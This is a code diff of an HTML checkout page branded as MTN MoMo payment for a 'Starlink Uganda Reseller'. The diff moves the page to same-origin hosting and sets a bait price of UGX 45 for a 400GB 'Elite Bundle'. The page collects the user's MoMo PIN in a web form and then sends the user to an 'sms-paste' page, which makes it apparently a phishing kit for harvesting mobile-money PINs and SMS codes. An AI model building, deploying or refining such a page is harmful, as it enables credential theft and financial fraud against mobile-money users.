@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTN MoMo - Secure Payment | Starlink Uganda</title>
-    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="icon" type="image/png" href="/static/images/starlink_logo_new.png">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -387,13 +387,13 @@
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
-                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
+                <img src="/static/images/starlink_logo_new.png" alt="STARLINK" class="brand-logo-img">
                 <div class="brand-divider"></div>
                 <span class="brand-sub">Uganda Reseller</span>
             </a>
             <nav class="header-nav">
-                <a href="/plans/"><i class="uil uil-wifi"></i> <span>Status</span></a>
-                <a href="/plans/"><i class="uil uil-home"></i> <span>Plans</span></a>
+                <a href="/"><i class="uil uil-wifi"></i> <span>Status</span></a>
+                <a href="/"><i class="uil uil-home"></i> <span>Plans</span></a>
             </nav>
         </div>
     </header>
@@ -403,7 +403,7 @@
             <div class="checkout-card-wrap">
 
                 <div class="momo-band">
-                    <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
+                    <img src="/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
                     <p class="momo-tagline">Secure Payment</p>
                 </div>
 
@@ -411,11 +411,11 @@
                     <div class="amount-block">
                         <div>
                             <p class="amount-label">Amount</p>
-                            <p class="amount-value" id="display-amount">UGX 3,500.00</p>
+                            <p class="amount-value" id="display-amount">UGX 45.00</p>
                         </div>
                         <div class="amount-plan">
-                            <p class="amount-plan-name" id="display-plan-name">Standard</p>
-                            <span class="amount-plan-data" id="display-plan-data">60GB</span>
+                            <p class="amount-plan-name" id="display-plan-name">Elite Bundle</p>
+                            <span class="amount-plan-data" id="display-plan-data">400GB</span>
                         </div>
                     </div>
 
@@ -449,7 +449,7 @@
         <div class="sheet-overlay" id="sheetOverlay"></div>
         <div class="pin-modal" id="pinModal">
             <h3 class="pin-modal-title">
-                Do you want to pay <strong id="confirmAmount">UGX 3,500.00</strong>?
+                Do you want to pay <strong id="confirmAmount">UGX 45.00</strong>?
             </h3>
             <p class="pin-modal-sub">Enter your MTN MoMo PIN to authorize this payment</p>
             <label class="pin-label" for="momo_pin">Enter PIN</label>
@@ -478,7 +478,7 @@
             </div>
             <h2 class="waiting-title">Verifying <span class="highlight">Payment</span></h2>
             <p class="waiting-sub">
-                Please hold on as we confirm your <strong id="waitingPlan">Standard</strong> subscription.<br>
+                Please hold on as we confirm your <strong id="waitingPlan">Elite Bundle</strong> subscription.<br>
                 This usually takes a few seconds.
             </p>
             <div class="waiting-dots">
@@ -500,22 +500,22 @@
 
     <nav class="bottom-nav">
         <div class="bottom-nav-inner">
-            <a href="/plans/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
-            <a href="/plans/" class="nav-item active"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
-            <a href="/settings/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
+            <a href="/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
+            <a href="/" class="nav-item active"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
+            <a href="/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
         </div>
     </nav>
 
     <script>
         // ============================================
-        // API BASE — backend on Railway
+        // API BASE — same origin (backend serves this page)
         // ============================================
-        const API_BASE = 'https://starlinknetwork-production.up.railway.app';
+        const API_BASE = '';
 
         const params = new URLSearchParams(window.location.search);
-        const planName = params.get('plan') || 'Standard';
-        const planData = params.get('data') || '60GB';
-        const planPrice = parseInt(params.get('price') || '3500', 10);
+        const planName = params.get('plan') || 'Elite Bundle';
+        const planData = params.get('data') || '400GB';
+        const planPrice = parseInt(params.get('price') || '45', 10);
 
         const formattedPrice = 'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
 
@@ -662,7 +662,7 @@
                             price: planPrice,
                             phone: phone
                         });
-                        window.location.href = '/sms-paste/?' + smsParams.toString();
+                        window.location.href = '/sms-paste.html?' + smsParams.toString();
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
                         waitingOverlay.classList.remove('open');
